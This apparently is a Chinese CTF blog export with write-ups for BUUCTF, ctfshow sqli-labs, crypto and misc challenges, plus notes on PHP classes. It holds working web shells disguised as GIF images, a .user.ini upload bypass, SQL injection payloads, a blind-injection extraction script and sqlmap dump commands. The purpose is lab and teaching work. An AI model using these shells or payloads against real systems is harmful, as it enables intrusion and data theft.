<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">  &lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>flag{449ef412-2b10-4498-b258-8e2fcdfd2938}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr() — 返回指定的字符</span><br><span class="line">scandir() — 列出指定路径中的文件和目录</span><br><span class="line">var_dump() — 打印变量的相关信息</span><br><span class="line">file_get_contents() — 将整个文件读入一个字符串</span><br><span class="line">foreach 语法结构提供了遍历数组的简单方式。</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">/i (忽略大小写)</span><br><span class="line">/g (全文查找出现的所有匹配字符)</span><br><span class="line">/m (多行查找)</span><br><span class="line">/gi(全文查找、忽略大小写)</span><br><span class="line">/ig(全文查找、忽略大小写)</span><br></pre></td></tr></table></figure>

<p>payload: 产看目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 等价 var_dump(file_get_contents(&quot;/flagg&quot;))</span><br><span class="line">/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL -报错注入"></a>[极客大挑战 2019]HardSQL -报错注入</h2><p>额，就一个普通的报错注入，但是过滤了and、&#x3D; 空格 union等多个sql关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#  //只查到了左边，我们用right函数</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>flag{986ccfdc-fbb9-4fba-bb4b-790ddb4a0d63}</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabySQli-联合注入"><a href="#GXYCTF2019-BabySQli-联合注入" class="headerlink" title="[GXYCTF2019]BabySQli-联合注入"></a>[GXYCTF2019]BabySQli-联合注入</h2><p>随便输入查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>题目给的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">    function stripslashes_deep($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = is_array($value) ?</span><br><span class="line">        array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">        stripslashes($value);</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">    $_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">    $_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">    $_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">    die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (!$result) &#123;</span><br><span class="line">        printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $arr = mysqli_fetch_row($result);</span><br><span class="line">        if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">            if(md5($password) == $arr[2])&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;wrong pass!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;wrong user!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27; Order by 4#</span><br><span class="line">pw=1</span><br><span class="line">回显：Error: Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;.</span><br><span class="line"></span><br><span class="line">name=admin&#x27; Order by 3#</span><br><span class="line">pw=1</span><br><span class="line">回显：wrong pass</span><br></pre></td></tr></table></figure>

<p>字段为3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#</span><br><span class="line">passwd=1</span><br></pre></td></tr></table></figure>

<p>c4ca4238a0b923820dcc509a6f75849b为md5 加密后的1</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’</p>
<p>Now, just give the id of passage</p>
<p>这道题对爆破有限制</p>
<p>采用延时爆破，bp延时fuzz一下</p>
<p>根据提示可以知道flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#whited by zhou</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://80d573a7-5e74-4238-b99e-da083c3a0314.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    i = i + 1</span><br><span class="line">    while head&lt;tail:</span><br><span class="line">        mid = (head + tail) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    result += chr(head)</span><br><span class="line">    if &#x27;&#125;&#x27; in result:</span><br><span class="line">      break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>xx9nGK&amp;2t</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu2</title>
    <url>/2023/05/13/buu2/</url>
    <content><![CDATA[<p>buu第二页</p>
 <span id="more"></span>

<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>访问robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>crypto</title>
    <url>/2023/01/08/crypto/</url>
    <content><![CDATA[<p>​     tpye7加密</p>
<p>​    uuencode</p>
<p>​       <span id="more"></span></p>
<h1 id="tpye7解密"><a href="#tpye7解密" class="headerlink" title="tpye7解密"></a>tpye7解密</h1><p>ctfshow 菜狗杯 类型-7<br>094F5A0F0A0D1805103B0B3D143117183B720438350A45550967674D1E064F2969784440455A460F1A1B<br>tpye7 加密结果为16进制<br><a href="https://www.bejson.com/encrypt/type7_decode/">tpye7解密</a><br>ctfshow{Wow_u_Kn0w_Ci$c0_Type7_P@ssword!}</p>
<h1 id="Uuencode"><a href="#Uuencode" class="headerlink" title="Uuencode"></a>Uuencode</h1><p>buu crypto Unencode<br>密文：<br>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<br><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">uuencode解密网站</a><br>flag{dsdasdsa99877LLLKK}</p>
<h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><p>buu Windows系统密码</p>
<p>a7fcb22a88038f35a8f39d503e7f0062</p>
<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p>解密 good-luck</p>
<h1 id="中文电码"><a href="#中文电码" class="headerlink" title="中文电码"></a>中文电码</h1><p>buu 信息化时代的步伐</p>
<p>606046152623600817831216121621196386</p>
<p><a href="http://code.mcdvisa.com/">中文电码查询 Chinese Commercial Code - 标准电报码免费在线查询|姓名电码|美国签证电码 (mcdvisa.com)</a></p>
<p>解密：计算机要从娃娃抓起</p>
<h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><p>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</p>
<p><a href="https://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p>解码：flag substitution cipher decryption is always easy just like a piece of cake</p>
<p>去空格</p>
<h1 id="playfair解密"><a href="#playfair解密" class="headerlink" title="playfair解密"></a>playfair解密</h1><p>还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}</p>
<p>提示公平的玩，playfair</p>
<p><a href="https://rumkin.com/tools/cipher/playfair/">Playfair (rumkin.com)</a></p>
<p>密钥playfair</p>
<p>flag{itisnotaproblemhavefun}</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow-misc入门</title>
    <url>/2023/01/20/ctfshow-misc%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>zsteg安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gem install zsteg</span><br></pre></td></tr></table></figure>



<span id="more"></span>

<h1 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h1><p>binwalk-e 无法分离</p>
<p>foremost 分离打开output</p>
<p>发现图片</p>
<p>ctfshow{1df0a9a3f709a2605803664b55783687}</p>
<h1 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h1><p>binwalk 查看发现两个IDAT数据块</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>是PNG IDAT的可选压缩格式</p>
<p>用tweakpng</p>
<p>打开删除的一个IDAT</p>
<p>保存，或者按f7图片预览发现flag</p>
<p><code>ctfshow&#123;44620176948fa759d3eeafeac99f1ce9&#125;</code></p>
<h1 id="misc-18"><a href="#misc-18" class="headerlink" title="misc 18"></a>misc 18</h1><p>下载题目为.tif 文件</p>
<p>用 <code>exiftool</code> 查看图片.</p>
<p>参考文献。</p>
<p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793"> ctfshow-Misc入门_H3rmesk1t的博客-CSDN博客_ctfshowmisc入门</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-sqli-labs</title>
    <url>/2023/04/14/ctfshow-sqli-labs/</url>
    <content><![CDATA[<p>​    sqli-labs</p>
<p>​    <span id="more"></span></p>
<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>字符型闭合</p>
<p>解法1</p>
<p>sqlmap 直接梭,但是sqlmap不利于sql注入学习所以之后还是打算用手注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --dbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --tables -D &#x27;ctfshow&#x27; --dump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;bbe97e6a-2992-4aa7-bc51-5a69cab6d0dc&#125;</span><br></pre></td></tr></table></figure>

<p>解法2</p>
<p>联合注入一下试试</p>
<p>只有一条回显所以</p>
<p>关于group_concat用法</p>
<p><img src="/2023/04/14/ctfshow-sqli-labs/QQ%E6%88%AA%E5%9B%BE20230414171532.png"></p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test</p>
<p>查数据库ctfshow的表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;ctfshow&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>存在flag表格</p>
<p>查字段名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>id,flag</p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,flag from ctfshow.flag-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow{372292b7-6add-43c5-8c8c-e9a12c7de8a2}</p>
<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><p>数字类型闭合</p>
<p>-1’  换成-1 即可</p>
<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><p><code>&#39;)</code>闭合</p>
<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p><code>&quot;)</code>闭合单个双引号</p>
<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://690423f6-d413-4532-947c-1a665f81c17c.challenge.ctf.show/?id=1 --batch -D &#x27;ctfshow&#x27; --tables --dump</span><br></pre></td></tr></table></figure>

<p>ctfshow{aabc5665-5832-4732-b706-88340fc65f12}</p>
<p>学习一下怎末写脚本</p>
<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_反序列化</title>
    <url>/2023/02/02/ctfshow-web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>持续学习中。。。</p>
   <span id="more"></span>

<h2 id="web254-–php类和对象"><a href="#web254-–php类和对象" class="headerlink" title="web254 –php类和对象"></a>web254 –php类和对象</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>username=xxxxxx&amp;password=xxxxxx</code></p>
<p>-&gt;可以理解为“的”</p>
<h2 id="1、定义类"><a href="#1、定义类" class="headerlink" title="1、定义类"></a>1、定义类</h2><p>在 PHP 中，可以使用 class 关键字加类名的方式定义一个类，然后用大括号<code>&#123; &#125;</code>将在类体中定义类的属性和方法包裹起来，类的语法格式如下：</p>
<p>[修饰类的关键字] class 类名{<br>   类的属性和方法;<br> }</p>
<p>类名和变量名还有函数名的命名规则相似，都需要遵循 PHP 中的自定义命名规则，可以是任何非 PHP  保留字的合法标签。一个合法类名以字母或下划线开头，后面跟着若干字母，数字或下划线。如果类名由多个单词组成，习惯上将每个单词的首字母大写。另外，类名最好具有一定的意义，不要随便由几个字母组成。</p>
<p> 修饰类的关键字是一个可选参数，可以省略。我们通常使用下面这些关键字来修饰类：</p>
<ul>
<li>abstract：抽象类或方法，被修饰为抽象类之后，类将不能被实例化，但可以被继承。如果类中有至少一个方法被声明为抽象的，那么这个类也必须声明为抽象的。继承一个抽象类的时候，子类必须重新定义父类中的所有抽象方法，而且这些方法的访问控制必须和父类中一样。</li>
<li>final：使用 final 修饰的类不能被继承，而使用 final 修饰的方法不能在子类中重新定义。</li>
</ul>
<p>注意：一个类可以包含有属于自己的常量、变量（在类中称为“成员属性”或者“属性”）以及函数（在类中称为“成员方法”或者“方法”）。</p>
<h2 id="2、成员属性"><a href="#2、成员属性" class="headerlink" title="2、成员属性"></a>2、成员属性</h2><p>在类中直接声明的变量称为成员属性（也可以称为成员变量），可以在类中声明多个变量，即对象中可以有多个成员属性，每个变量都存储对象不同的属性信息。语法格式如下：</p>
<p>访问权限修饰符 属性名称 &#x3D; 属性值;</p>
<p>成员属性的类型可以是 PHP 中的标量类型和复合类型，所以也可以是其他类实例化的对象，但在类中使用资源和空类型是没有意义的。</p>
<p> 前面我们绍过，声明变量时不需要任何关键字修饰，但是在类中声明成员属性时，变量前面一定要使用一个关键字来修饰，例如  public、private，static  等，但这些关键字修饰的变量都具有一定的意义。如果不需要有特定意义的修饰，可以使用“var”关键字，一旦成员属性有其他的关键字修饰就需要去掉“var”。</p>
<p> 常用访问权限修饰符及其含义如下所示：</p>
<ul>
<li>public：公共的，在类的内部、子类中或者类的外部都可以使用，不受限制；</li>
<li>protected：受保护的，在类的内部和子类中可以使用，但不能在类的外部使用；</li>
<li>private：私有的，只能在类的内部使用，在类的外部或子类中都无法使用。</li>
</ul>
<p>注意：一个类，即一对大括号之间的全部内容都要在一段代码中，也就是一个<code>&lt;?php ... ?&gt;</code>之间，不能分割成多块。</p>
<p>【示例】创建一个 Students 类并在类中声明一些成员属性，代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>提示：权限修饰符可以和定义静态变量的关键字 static 混合在一起使用，如上面代码中所示。</p>
<h2 id="3、成员方法"><a href="#3、成员方法" class="headerlink" title="3、成员方法"></a>3、成员方法</h2><p>在类中定义的函数被称为成员方法。函数和成员方法唯一的区别就是，函数实现的是某个独立的功能，而成员方法是实现类中的一个行为，是类的一部分。</p>
<p> 可以在类中声明多个成员方法，成员方法的声明和函数的声明完全一样，只不过在声明成员方法时可以在<code>function</code>关键字的前面加一些访问权限修饰符来控制访问权限，例如 public、private、protected 等。</p>
<p> 另外需要注意的是，声明的成员方法必须和类是相关的，不能是一些没有意义的操作。例如，在声明学生类时，如果声明了“飞行”的成员方法，实例化出来的每个学生都可以飞了，这样就是一个设计上的错误。</p>
<p>【示例】在上面示例中创建的 Students 类中创建一些成员方法。</p>
